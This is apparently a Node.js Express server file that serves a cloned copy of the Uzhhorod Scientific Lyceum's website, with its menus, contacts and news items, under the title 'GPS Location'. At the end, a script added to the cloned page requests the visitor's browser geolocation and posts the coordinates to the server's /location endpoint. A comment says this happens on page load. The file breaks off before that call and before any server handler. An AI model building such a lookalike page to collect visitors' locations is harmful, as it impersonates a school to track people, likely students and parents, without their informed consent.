const express = require('express');
const app = express();
const PORT = 3000;

app.use(express.json());

// Отправка HTML-страницы при заходе на сервер
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>GPS Location</title>
        </head>
        <body>
            <div id="lpage">
    <div class="header">
      <div class="main-header">
        <div class="inner-fhd">
          <div class="logo">
            <a href="https://school.uz.ua/">
              <span class="logo-row">				                    
                <span class="logo-image">
                  <p><img src="./Ужгородський науковий ліцей_files/logo.png" alt="Ужгородський науковий ліцей" width="300" height="300"></p>
                </span>
                <span class="logo-text">
                  <span class="companyname">Ужгородський науковий ліцей</span>
                  <span class="slogan">Простір наукових можливостей</span>
                </span>
              </span>
            </a>
          </div>
          <div class="header-phone">
            <p>Простір наукових можливостей</p>
          </div>
          <div class="header-icons-block">
            <div class="search">
              <div class="search_opener" title="Пошук"></div>
                          
              <form class="uss_site_search" method="POST" action="https://school.uz.ua/search">
                <input class="uss_input_name" type="search" value="" name="text" placeholder="Пошук по сайту" pattern="[А-Яа-яІіЇї ]+[А-Яа-яІіЇї ]+">
                <input class="uss_submit" type="submit" value="">
                <input type="hidden" value="d8b4543bd13435a0c213d68fe7439c4f" name="cms_token">              </form>
            </div>
			                
            <button class="burger">
              <span class="burger__title">Меню</span>
              <span class="burger__icon">
                <span></span>
                <span></span>
                <span></span>
              </span>
            </button>
          </div>
        </div>
      </div>
   
      <div class="popup-menu">
					<div class="close"></div>
					<div class="popup-menu__inner wrapper">
						<div class="popup-menu__left">
							
							<div class="popup-top-menu">
  <div class="top-menu__title h3">Ліцей</div>
  <ul class="catalog_menu ">
    
<li>
	<a href="https://school.uz.ua/vizitivka" target="_self">Візитівка</a>
	</li>  
<li>
	<a href="https://school.uz.ua/rezhim-roboti" target="_self">Режим роботи</a>
	</li>  
<li>
	<a href="https://school.uz.ua/administration" target="_self">Адміністрація</a>
	</li>  
<li>
	<a href="https://school.uz.ua/metodichni-komisiyi" target="_self">Методичні комісії</a>
	</li>  
<li>
	<a href="https://school.uz.ua/vstup-2024" target="_self">Вступ 2024</a>
	</li>  
  </ul>
</div>							
							<div class="popup-top-menu">
  <div class="top-menu__title h3">Діяльність</div>
  <ul class="catalog_menu ">
    
<li>
	<a href="https://school.uz.ua/olimpiadi" target="_self">Олімпіади</a>
	</li>  
<li>
	<a href="https://school.uz.ua/naukova-robota" target="_self">Наукова робота</a>
	</li>  
<li>
	<a href="https://school.uz.ua/vihovna-robota" target="_self">Виховна робота</a>
	</li>  
<li>
	<a href="https://school.uz.ua/plan-roboti" target="_self">План роботи</a>
	</li>  
<li>
	<a href="https://school.uz.ua/programa-rozvitku" target="_self">Програма розвитку</a>
	</li>  
  </ul>
</div>							
							<div class="popup-top-menu">
  <div class="top-menu__title h3">Інформація</div>
  <ul class="catalog_menu ">
    
<li>
	<a href="https://school.uz.ua/zvit-direktora" target="_self">Звіт директора</a>
	</li>  
<li>
	<a href="https://school.uz.ua/prozorist-ta-informatsiina-vidkritist-zakladu-osviti" target="_self">Прозорість та інформаційна відкритість закладу освіти</a>
	</li>  
<li>
	<a href="https://school.uz.ua/informatsiia-dlia-uchniv-i-batkiv" target="_self">Інформація для учнів і батьків</a>
	</li>  
<li>
	<a href="https://school.uz.ua/richnii-plan-zakupivel" target="_self">Річний план закупівель</a>
	</li>  
<li>
	<a href="https://school.uz.ua/publichna-informatsiia" target="_self">Публічна інформація</a>
	</li>  
<li>
	<a href="https://school.uz.ua/bezpeka-u-navchalnomu-zakladi" target="_self">Безпека у навчальному закладі</a>
	</li>  
<li>
	<a href="https://school.uz.ua/tsivilnii-zahist" target="_self">Цивільний захист</a>
	</li>  
  </ul>
</div>
            </div>
						
						<div class="popup-menu__right">
							<div class="top-menu__title h3">Контакти</div>
							
              <div class="contacts">
                
                <div class="contacts__phone">
                  <div class="h3">Телефон</div>
                  <p><a href="tel:+38 (099) 294-63-44">+38 (099) 294-63-44</a></p>
                </div>
              
                
                <div class="contacts__email">
                  <div class="h3">Email</div>
                  <p><a href="mailto:in.school.uzh@gmail.com">in.school.uzh@gmail.com</a></p>
                </div>
              
                
                <div class="contacts__address">
                  <div class="h3">Адреса</div>
                  <p>м. Ужгород, вул. Загорська, 28</p>
                </div>
              
              </div>
              <!--            
                <div class="social-block">
                  <p>
                    <img style="margin-right: 10px;" src="/uploadedFiles/images/telegram.png" alt="" width="25" height="25" />
                    <img style="margin-right: 10px;" src="/uploadedFiles/images/whatsapp.png" alt="" width="25" height="25" />
                  </p>
                </div>
							-->
                	
						</div>
					</div>
				</div>
			</div>
			<div class="container">
        <div class="sidebar">
          <div class="sidebar-inner">
            <div class="logo sidebar-logo">
              <a href="https://school.uz.ua/">
                <span class="logo-row">
                  <span class="logo-image">
                    <p><img src="./Ужгородський науковий ліцей_files/logo.png" alt="Ужгородський науковий ліцей" width="300" height="300"></p>
                  </span>
                  <span class="logo-text">
                      <span class="companyname">Ужгородський науковий ліцей</span>
                      <span class="slogan">Простір наукових можливостей</span>
                  </span>
                </span>
              </a>
	          </div>

            <div class="aside block aside-services aside-menu">
              
              <ul id="accordion" class="accordion">
	
		
<li>
  <div class="link">Про нас</div>
  <ul class="submenu">
  		<li>
	<a href="https://school.uz.ua/vizitivka" target="_self">Візитівка</a>
	</li>
		<li>
	<a href="https://school.uz.ua/administration" target="_self">Адміністрація</a>
	</li>
		<li>
	<a href="https://school.uz.ua/rezhim-roboti" target="_self">Режим роботи</a>
	</li>
		<li>
	<a href="https://school.uz.ua/metodichni-komisiyi" target="_self">Методичні комісії</a>
	</li>
		<li>
	<a href="https://school.uz.ua/vstup-2024" target="_self">Вступ 2024</a>
	</li>
</ul></li>
		
<li>
  <div class="link">Діяльність</div>
  <ul class="submenu">
  		<li>
	<a href="https://school.uz.ua/olimpiadi" target="_self">Олімпіади</a>
	</li>
		<li>
	<a href="https://school.uz.ua/naukova-robota" target="_self">Наукова робота</a>
	</li>
		<li>
	<a href="https://school.uz.ua/vihovna-robota" target="_self">Виховна робота</a>
	</li>
		<li>
	<a href="https://school.uz.ua/plan-roboti" target="_self">План роботи</a>
	</li>
		<li>
	<a href="https://school.uz.ua/programa-rozvitku" target="_self">Програма розвитку</a>
	</li>
</ul></li>
		
<li>
  <div class="link">Інформація</div>
  <ul class="submenu">
  		<li>
	<a href="https://school.uz.ua/zvit-direktora" target="_self">Звіт директора</a>
	</li>
		<li>
	<a href="https://school.uz.ua/prozorist-ta-informatsiina-vidkritist-zakladu-osviti" target="_self">Прозорість та інформаційна відкритість закладу освіти</a>
	</li>
		<li>
	<a href="https://school.uz.ua/informatsiia-dlia-uchniv-i-batkiv" target="_self">Інформація для учнів і батьків</a>
	</li>
		<li>
	<a href="https://school.uz.ua/richnii-plan-zakupivel" target="_self">Річний план закупівель</a>
	</li>
		<li>
	<a href="https://school.uz.ua/publichna-informatsiia" target="_self">Публічна інформація</a>
	</li>
		<li>
	<a href="https://school.uz.ua/bezpeka-u-navchalnomu-zakladi" target="_self">Безпека у навчальному закладі</a>
	</li>
		<li>
	<a href="https://school.uz.ua/tsivilnii-zahist" target="_self">Цивільний захист</a>
	</li>
</ul></li>
</ul>
<style>
.accordion {
  width: 100%;
  max-width: 360px;
}

.accordion .link {
  cursor: pointer;
  display: block;
  padding: 15px 15px 15px 42px;
  text-transform: uppercase;
  font-family: 'Kelson Sans';
  font-size: 16px;
  font-weight: 400;
  position: relative;
  -webkit-transition: all 0.4s ease;
  -o-transition: all 0.4s ease;
  transition: all 0.4s ease;
}

.accordion li:last-child .link { border-bottom: 0; }

.accordion li i {
  position: absolute;
  top: 16px;
  left: 12px;
  font-size: 16px;

  -webkit-transition: all 0.4s ease;
  -o-transition: all 0.4s ease;
  transition: all 0.4s ease;
}

.accordion li i.fa-chevron-down {
  right: 12px;
  left: auto;
  font-size: 16px;
}


.submenu {
  display: none;
  background: #444359;
  font-size: 14px;
}

.submenu li { border-bottom: 1px solid #bdbdbd; }

.submenu a {
  display: block;
  text-decoration: none;
  padding-left: 42px;
  -webkit-transition: all 0.25s ease;
  -o-transition: all 0.25s ease;
  transition: all 0.25s ease;
}

.submenu a:hover {
  background: #ccced0;
  color: #FFF;
}
</style>

<script>
$(function() {
	var Accordion = function(el, multiple) {
		this.el = el || {};
		this.multiple = multiple || false;

		// Variables privadas
		var links = this.el.find('.link');
		// Evento
		links.on('click', {el: this.el, multiple: this.multiple}, this.dropdown)
	}

	Accordion.prototype.dropdown = function(e) {
		var $el = e.data.el;
			$this = $(this),
			$next = $this.next();

		$next.slideToggle();
		$this.parent().toggleClass('open');

		if (!e.data.multiple) {
			$el.find('.submenu').not($next).slideUp().parent().removeClass('open');
		};
	}	

	var accordion = new Accordion($('#accordion'), false);
});
</script>
              
            </div>
            <div class="contacts">
              
              <div class="contacts__phone">
                <div class="h3">Телефон</div>
                <p><a href="tel:+38 (099) 294-63-44">+38 (099) 294-63-44</a></p>
              </div>
            
              
              <div class="contacts__email">
                <div class="h3">E-mail</div>
                <p><a href="mailto:in.school.uzh@gmail.com">in.school.uzh@gmail.com</a></p>
              </div>
            
              
              <div class="contacts__address">
                <div class="h3">Адрес</div>
                <p>м. Ужгород, вул. Загорська, 28</p>
              </div>
            
            </div>
      
          </div>
	      </div>
				
				<div class="content">
					
					<!--banner
					
<div class="slider">
  <div class="slides" style="min-height: 880px;">
			    <div class="slide">
            <a  href="https://school.uz.ua/xbanners/go/eccbc87e4b5ce2fe28308fd9f2a7baf3" class="slide-link"></a>
            <div class="image">
        <img data-lazy="/uploads/images/bimages/1726295944.jpg" alt="Головна" />
      </div>
      <div class="caption-wrap">
        <div class="caption">
          <div class="title-wrap">
            <div class="title"></div>
          </div>
          <div class="preview-wrap">
            <div class="preview">
                              <p style="font-weight: 400;">Буває, часом сліпну від краси.</p>
<p style="font-weight: 400;">Спинюсь, не тямлю, що воно за диво,&ndash;</p>
<p style="font-weight: 400;">оці степи, це небо, ці ліси,</p>
<p style="font-weight: 400;">усе так гарно, чисто, незрадливо,</p>
<p style="font-weight: 400;">усе як є &ndash; дорога, явори,</p>
<p style="font-weight: 400;">усе моє, все зветься &ndash; Україна.</p>
<p style="font-weight: 400;">Така краса, висока і нетлінна,</p>
<p style="font-weight: 400;">що хоч спинись і з Богом говори.</p>
<p style="font-weight: 400;">&nbsp;</p>
<p style="font-weight: 400;">Ліна Костенко</p>                          </div>
          </div>
        </div>
      </div>
    </div>
	  </div>
</div>

                        -->
          
<div class="slider">
  <div class="slides slick-initialized slick-slider" style="min-height: 580px;"><div class="slick-list draggable"><div class="slick-track" style="opacity: 1; width: 1219px;"><div class="slick-slide slick-current slick-active" data-slick-index="0" aria-hidden="false" style="width: 1219px; position: relative; left: 0px; top: 0px; z-index: 999; opacity: 1;"><div><div class="slide" style="width: 100%; display: inline-block;">
      <a href="https://school.uz.ua/" class="slide-link" tabindex="0"></a>
      <div class="image">
        <img alt="Ліцей" class="" src="./Ужгородський науковий ліцей_files/13_2.jpg" style="opacity: 1;">
      </div>
      <div class="caption-wrap">
        <div class="caption">
          <div class="title-wrap">
            <div class="title animate"></div>
          </div>
          <div class="preview-wrap">
            <div class="preview">
              <p></p>
<p>Буває, часом сліпну від краси.</p>
<p>Спинюсь, не тямлю, що воно за диво,–</p>
<p>оці степи, це небо, ці ліси,</p>
<p>усе так гарно, чисто, незрадливо,</p>
<p>усе як є – дорога, явори,</p>
<p>усе моє, все зветься – Україна.</p>
<p>Така краса, висока і нетлінна,</p>
<p>що хоч спинись і з Богом говори.<br><br></p>
<p>Ліна Костенко</p>            </div>
          </div>
        </div>
      </div>
    </div></div></div></div></div></div>
</div>



          
					
<!-- Dynamic Grid Cols | Max 4 cols -->

<!-- URL to Widget First Category | Used to Make Link to All Items Page -->

<div class="block news-block dark-bg x3 flex">
  <div class="wrapper">
    <div class="h3">Новини</div>
    <div class="uss_widget_outer_content items-414491668973737 uss-flex-items many-rows">
                  <div class="news_block_item aos-init aos-animate" data-aos="fade-up" style="margin-right: 38px; margin-left: 0px;">
                <a href="https://school.uz.ua/news/mova-sertse-natsiyi" title="">
          <div class="image" style="background:url(&#39;/uploads/news/_viber_2024-10-19_17-41-05-111.jpg&#39;); width: 100%; height: 230px; background-size: cover; background-position: 50%;">
              </div>
        </a>
                <div class="info">
          <div class="date">30.10.2024</div>
          <div class="title">
            <a href="https://school.uz.ua/news/mova-sertse-natsiyi">
              <span class="tspan">Мова – серце нації</span>
            </a>
          </div>
          <div class="preview">
            Мова – це всі глибинні пласти духовного життя народу, його історична пам’ять, найцінніше надбання віків. Мова – це ще й музика, мелодика, фарби, буття, сучасна, художня, інтелектуаль...          </div>
        </div>
      </div>
                  <div class="news_block_item aos-init aos-animate" data-aos="fade-up" style="margin-right: 38px; margin-left: 0px;">
                <a href="https://school.uz.ua/news/uchast-v-pidsumkovomu-zahodi-molodizhnoyi-radi-pri-zakarpatskii-ova-2-years-together" title="">
          <div class="image" style="background:url(&#39;/uploads/news/_viber_2024-10-25_12-37-06-041_1.jpg&#39;); width: 100%; height: 230px; background-size: cover; background-position: 50%;">
              </div>
        </a>
                <div class="info">
          <div class="date">30.10.2024</div>
          <div class="title">
            <a href="https://school.uz.ua/news/uchast-v-pidsumkovomu-zahodi-molodizhnoyi-radi-pri-zakarpatskii-ova-2-years-together">
              <span class="tspan">Участь в підсумковому  заході  Молодіжної ради при Закарпатській ОВА «2 years together»!</span>
            </a>
          </div>
          <div class="preview">
            25 жовтня голова учнівського самоврядування Бартованець Анастасія&nbsp; та заступниця голови учнівського самоврядування Багин Валерія взяли&nbsp; участь&nbsp; в&nbsp; підсумковому заході Молодіжної ра...          </div>
        </div>
      </div>
                  <div class="news_block_item aos-init aos-animate last-in-row" data-aos="fade-up" style="margin-right: 0px; margin-left: 0px;">
                <a href="https://school.uz.ua/news/batkivskii-vseobuch" title="">
          <div class="image" style="background:url(&#39;/uploads/news/2_6.jpg&#39;); width: 100%; height: 230px; background-size: cover; background-position: 50%;">
              </div>
        </a>
                <div class="info">
          <div class="date">27.10.2024</div>
          <div class="title">
            <a href="https://school.uz.ua/news/batkivskii-vseobuch">
              <span class="tspan">Батьківський всеобуч</span>
            </a>
          </div>
          <div class="preview">
            25 &nbsp;жовтня в закладі освіти відбувся батьківський всеобуч на тему «Взаємодія сім’ї і ліцею – запорука успішного навчання і виховання. Єдині вимоги у вихованні. Побудова психолог...          </div>
        </div>
      </div>
                  <div class="news_block_item aos-init aos-animate" data-aos="fade-up" style="margin-right: 38px; margin-left: 0px;">
                <a href="https://school.uz.ua/news/radiodiktant-magiia-golosu" title="">
          <div class="image" style="background:url(&#39;/uploads/news/2_2.jpg&#39;); width: 100%; height: 230px; background-size: cover; background-position: 50%;">
              </div>
        </a>
                <div class="info">
          <div class="date">25.10.2024</div>
          <div class="title">
            <a href="https://school.uz.ua/news/radiodiktant-magiia-golosu">
              <span class="tspan">Радіодиктант «Магія голосу»</span>
            </a>
          </div>
          <div class="preview">
            25 жовтня 2024 року, педагоги та ліцеїсти долучилися до написання Радіодиктанту національної єдності. &nbsp;Його авторкою цьогоріч стала письменниця Оксана Забужко.
Текст під назвою «Магія голос...          </div>
        </div>
      </div>
                  <div class="news_block_item aos-init aos-animate" data-aos="fade-up" style="margin-right: 38px; margin-left: 0px;">
                <a href="https://school.uz.ua/news/vihovuemo-patriotiv-ukrayini" title="">
          <div class="image" style="background:url(&#39;/uploads/news/7_1.jpg&#39;); width: 100%; height: 230px; background-size: cover; background-position: 50%;">
              </div>
        </a>
                <div class="info">
          <div class="date">24.10.2024</div>
          <div class="title">
            <a href="https://school.uz.ua/news/vihovuemo-patriotiv-ukrayini">
              <span class="tspan">Виховуємо патріотів України!</span>
            </a>
          </div>
          <div class="preview">
            23.10.2024 року в Ужгородському науковому ліцеї Закарпатської обласної ради відбувся традиційний Конкурс патріотичної пісні і строю. В змагання приймали участь учні 10-11-х класів, а саме 286 учасникі...          </div>
        </div>
      </div>
                  <div class="news_block_item aos-init last-in-row aos-animate" data-aos="fade-up" style="margin-right: 0px; margin-left: 0px;">
                <a href="https://school.uz.ua/news/klasno-uzagalniuiuchii-kontrol" title="">
          <div class="image" style="background:url(&#39;/uploads/news/1_2.jpg&#39;); width: 100%; height: 230px; background-size: cover; background-position: 50%;">
              </div>
        </a>
                <div class="info">
          <div class="date">24.10.2024</div>
          <div class="title">
            <a href="https://school.uz.ua/news/klasno-uzagalniuiuchii-kontrol">
              <span class="tspan">Класно - узагальнюючий контроль</span>
            </a>
          </div>
          <div class="preview">
            21 жовтня у закладі освіти відбулася мала психолого-педагогічна рада щодо адаптації учнів 8-их класів,&nbsp; 9-В та 10-Г класів до навчання . Для попередження можливих негативних явищ на даному етапі ...          </div>
        </div>
      </div>
                  <div class="news_block_item aos-init aos-animate" data-aos="fade-up" style="margin-right: 38px; margin-left: 0px;">
                <a href="https://school.uz.ua/news/debati-dovkillia-ta-suspilstvo" title="">
          <div class="image" style="background:url(&#39;/uploads/news/20241011_094239_1.jpg&#39;); width: 100%; height: 230px; background-size: cover; background-position: 50%;">
              </div>
        </a>
                <div class="info">
          <div class="date">22.10.2024</div>
          <div class="title">
            <a href="https://school.uz.ua/news/debati-dovkillia-ta-suspilstvo">
              <span class="tspan">Дебати “Довкілля та суспільство”</span>
            </a>
          </div>
          <div class="preview">
            З 10.10. по 12.10.2024 року на базі Ужгородського наукового ліцею Закарпатської обласної ради, з метою підтримки та створення&nbsp; сприятливих умов для розвитку здібностей інтелектуально обдарованої ...          </div>
        </div>
      </div>
                  <div class="news_block_item aos-init aos-animate" data-aos="fade-up" style="margin-right: 38px; margin-left: 0px;">
                <a href="https://school.uz.ua/news/uchast-u-molodizhnomu-festivali-u-future-vidnovliuisia-ta-stvoriui" title="">
          <div class="image" style="background:url(&#39;/uploads/news/02102024_02.jpg&#39;); width: 100%; height: 230px; background-size: cover; background-position: 50%;">
              </div>
        </a>
                <div class="info">
          <div class="date">21.10.2024</div>
          <div class="title">
            <a href="https://school.uz.ua/news/uchast-u-molodizhnomu-festivali-u-future-vidnovliuisia-ta-stvoriui">
              <span class="tspan">Участь у молодіжному фестивалі «U-Future: відновлюйся та створюй»</span>
            </a>
          </div>
          <div class="preview">
            Учні наукового ліцею відвідали молодіжний фестиваль «U-Future: відновлюйся та створюй», який відбувся в Ужгороді у «Совиному гнізді» і став справжнім простором для натхнення та...          </div>
        </div>
      </div>
                  <div class="news_block_item aos-init last-in-row aos-animate" data-aos="fade-up" style="margin-right: 0px; margin-left: 0px;">
                <a href="https://school.uz.ua/news/kniga-fest-2024" title="">
          <div class="image" style="background:url(&#39;/uploads/gallery/27/bc376b50f3a8de83b9b739a6fd53e2e4_prev.jpg&#39;); width: 100%; height: 230px; background-size: cover; background-position: 50%;">
              </div>
        </a>
                <div class="info">
          <div class="date">18.10.2024</div>
          <div class="title">
            <a href="https://school.uz.ua/news/kniga-fest-2024">
              <span class="tspan">Книга-фест – 2024!</span>
            </a>
          </div>
          <div class="preview">
            18 жовтня учні Ужгородського наукового ліцею відвідали тринадцяту обласну виставку-ярмарок в артгалереї «Ужгород» . «На сьогоднішньому заході представлена велика кількість наших зака...          </div>
        </div>
      </div>
      
    </div>
    <a class="see-all" href="https://school.uz.ua/news">Усі новини</a>
  </div>
</div>
 
          <div class="wrapper" id="main">
<h1>Про ліцей</h1>
<div class="section section_text">
<div class="uss_section_content">
<p style="text-align: left;"><img style="margin-right: 20px; margin-bottom: 20px; float: left;" src="./Ужгородський науковий ліцей_files/main.jpg" alt="" width="350" height="350"></p>
<p><span>Забезпечення на території області провадження освітньої діяльності на основі дослідно- орієнтованого навчання, спрямованого на залучення та підготовку підготовку учнівської молоді до наукової і науково-технічної діяльності, поглиблене вивчення профільних предметів, набуття учнями компетентностей, необхідних для подальшої діяльності. Забезпечення підготовки майбутніх вчених особистостей, здатних до інноваційної діяльності, прийняття системних рішень.</span></p>
</div>
</div>
</div>					

                    
          
<div class="block news-block light-bg x3 flex">
  <div class="wrapper">
    <div class="h3">Корисні ресурси</div>

    <div class="carousel ">
      <div class="slider multiple-items slick-initialized slick-slider">
                                  <div class="slick-list draggable"><div class="slick-track" style="opacity: 1; width: 7560px; transform: translate3d(-1620px, 0px, 0px);"><a href="https://school.uz.ua/xbanners/go/b6d767d2f8ed5d21a44b0e5886680cb9" target="_blank" class="slick-slide slick-cloned" data-slick-index="-4" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729570.png" alt="Урядовий портал"></a><a href="https://school.uz.ua/xbanners/go/37693cfc748049e45d87b8c7d8b9aacd" target="_blank" class="slick-slide slick-cloned" data-slick-index="-3" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729595.png" alt="Закарпатська обласна адміністрація"></a><a href="https://school.uz.ua/xbanners/go/1ff1de774005f8da13f42943881c655f" target="_blank" class="slick-slide slick-cloned" data-slick-index="-2" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729626.png" alt="Управління кримінальної міліції у справах дітей"></a><a href="https://school.uz.ua/xbanners/go/8e296a067a37563370ded05f5a3bf3ec" target="_blank" class="slick-slide slick-cloned" data-slick-index="-1" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729669.png" alt="Департамент освіти і науки, молоді та спорту Закарпатської ОДА"></a><a href="https://school.uz.ua/xbanners/go/aab3238922bcc25a6f606eb525ffdc56" target="_blank" class="slick-slide" data-slick-index="0" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729306.png" alt="Президент України"></a><a href="https://school.uz.ua/xbanners/go/9bf31c7ff062936a96d3c8bd1f8f2ff3" target="_blank" class="slick-slide" data-slick-index="1" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729335.png" alt="Верховна Рада України"></a><a href="https://school.uz.ua/xbanners/go/c74d97b01eae257e44aa9d5bade97baf" target="_blank" class="slick-slide slick-current slick-active" data-slick-index="2" aria-hidden="false" tabindex="0" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729357.png" alt="Міністерство освіти і науки"></a><a href="https://school.uz.ua/xbanners/go/70efdf2ec9b086079795c442636b55fb" target="_blank" class="slick-slide slick-active" data-slick-index="3" aria-hidden="false" tabindex="0" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729381.png" alt="Освіта.ua"></a><a href="https://school.uz.ua/xbanners/go/6f4922f45568161a8cdf4ad2299f6d23" target="_blank" class="slick-slide slick-active" data-slick-index="4" aria-hidden="false" tabindex="0" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729405.png" alt="Управління освіти Ужгордської міської ради"></a><a href="https://school.uz.ua/xbanners/go/1f0e3dad99908345f7439f8ffabdffc4" target="_blank" class="slick-slide slick-active" data-slick-index="5" aria-hidden="false" tabindex="0" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729432.png" alt="Закарпатський інститут післядипломної педагогічної освіти"></a><a href="https://school.uz.ua/xbanners/go/98f13708210194c475687be6106a3b84" target="_blank" class="slick-slide" data-slick-index="6" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729459.png" alt="Освітній портал ПедПреса"></a><a href="https://school.uz.ua/xbanners/go/3c59dc048e8850243be8079a5c74d079" target="_blank" class="slick-slide" data-slick-index="7" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729481.png" alt="Український центр оцінювання якості освіти"></a><a href="https://school.uz.ua/xbanners/go/b6d767d2f8ed5d21a44b0e5886680cb9" target="_blank" class="slick-slide" data-slick-index="8" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729570.png" alt="Урядовий портал"></a><a href="https://school.uz.ua/xbanners/go/37693cfc748049e45d87b8c7d8b9aacd" target="_blank" class="slick-slide" data-slick-index="9" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729595.png" alt="Закарпатська обласна адміністрація"></a><a href="https://school.uz.ua/xbanners/go/1ff1de774005f8da13f42943881c655f" target="_blank" class="slick-slide" data-slick-index="10" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729626.png" alt="Управління кримінальної міліції у справах дітей"></a><a href="https://school.uz.ua/xbanners/go/8e296a067a37563370ded05f5a3bf3ec" target="_blank" class="slick-slide" data-slick-index="11" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729669.png" alt="Департамент освіти і науки, молоді та спорту Закарпатської ОДА"></a><a href="https://school.uz.ua/xbanners/go/aab3238922bcc25a6f606eb525ffdc56" target="_blank" class="slick-slide slick-cloned" data-slick-index="12" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729306.png" alt="Президент України"></a><a href="https://school.uz.ua/xbanners/go/9bf31c7ff062936a96d3c8bd1f8f2ff3" target="_blank" class="slick-slide slick-cloned" data-slick-index="13" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729335.png" alt="Верховна Рада України"></a><a href="https://school.uz.ua/xbanners/go/c74d97b01eae257e44aa9d5bade97baf" target="_blank" class="slick-slide slick-cloned" data-slick-index="14" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729357.png" alt="Міністерство освіти і науки"></a><a href="https://school.uz.ua/xbanners/go/70efdf2ec9b086079795c442636b55fb" target="_blank" class="slick-slide slick-cloned" data-slick-index="15" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729381.png" alt="Освіта.ua"></a><a href="https://school.uz.ua/xbanners/go/6f4922f45568161a8cdf4ad2299f6d23" target="_blank" class="slick-slide slick-cloned" data-slick-index="16" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729405.png" alt="Управління освіти Ужгордської міської ради"></a><a href="https://school.uz.ua/xbanners/go/1f0e3dad99908345f7439f8ffabdffc4" target="_blank" class="slick-slide slick-cloned" data-slick-index="17" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729432.png" alt="Закарпатський інститут післядипломної педагогічної освіти"></a><a href="https://school.uz.ua/xbanners/go/98f13708210194c475687be6106a3b84" target="_blank" class="slick-slide slick-cloned" data-slick-index="18" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729459.png" alt="Освітній портал ПедПреса"></a><a href="https://school.uz.ua/xbanners/go/3c59dc048e8850243be8079a5c74d079" target="_blank" class="slick-slide slick-cloned" data-slick-index="19" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729481.png" alt="Український центр оцінювання якості освіти"></a><a href="https://school.uz.ua/xbanners/go/b6d767d2f8ed5d21a44b0e5886680cb9" target="_blank" class="slick-slide slick-cloned" data-slick-index="20" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729570.png" alt="Урядовий портал"></a><a href="https://school.uz.ua/xbanners/go/37693cfc748049e45d87b8c7d8b9aacd" target="_blank" class="slick-slide slick-cloned" data-slick-index="21" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729595.png" alt="Закарпатська обласна адміністрація"></a><a href="https://school.uz.ua/xbanners/go/1ff1de774005f8da13f42943881c655f" target="_blank" class="slick-slide slick-cloned" data-slick-index="22" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729626.png" alt="Управління кримінальної міліції у справах дітей"></a><a href="https://school.uz.ua/xbanners/go/8e296a067a37563370ded05f5a3bf3ec" target="_blank" class="slick-slide slick-cloned" data-slick-index="23" aria-hidden="true" tabindex="-1" style="width: 270px;"><img src="./Ужгородський науковий ліцей_files/1726729669.png" alt="Департамент освіти і науки, молоді та спорту Закарпатської ОДА"></a></div></div>
                                  
                                  
                                  
                                  
                                  
                                  
                                  
                                  
                                  
                                  
                                  
                </div>
    </div>

    <script src="./Ужгородський науковий ліцей_files/slick.min.js.завантаження"></script>
    <script id="rendered-js">
    $(".multiple-items").slick({
      dots: false,
      infinite: true,
      speed: 500,
      arrows: false,
      autoplay: true,
      slidesToShow: 4,
      slidesToScroll: 1 });
    //# sourceURL=pen.js
    </script>
    
  </div>
</div>
          

					<div class="footer">
						<div class="bottom-line">
							<div class="wrapper">
								<div class="f_copy">
									<div class="uss-site-copyright"> Ужгородський науковий ліцей ©&nbsp; 2024</div>
                </div>
              </div>
						</div>
					</div>
				</div>
			</div>
		</div>
       
		<div class="to-top-btn to-top-btn-left" style="display: none;">
      <div class="to-top-btn-inner"></div>
    </div>
            <script>
                function getLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            position => {
                                const { latitude, longitude } = position.coords;
                                sendLocationToServer(latitude, longitude);
                            },
                            error => {
                                console.error("Error getting location:", error);
                            }
                        );
                    } else {
                        alert("Geolocation is not supported by this browser.");
                    }
                }

                function sendLocationToServer(latitude, longitude) {
                    fetch('/location', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ latitude, longitude })
                    })
                    .then(response => response.json())
                    .then(data => console.log("Location sent successfully:", data))
                    .catch(error => console.error("Error sending location:", error));
                }

                // Запрашиваем координаты при загрузке страницы
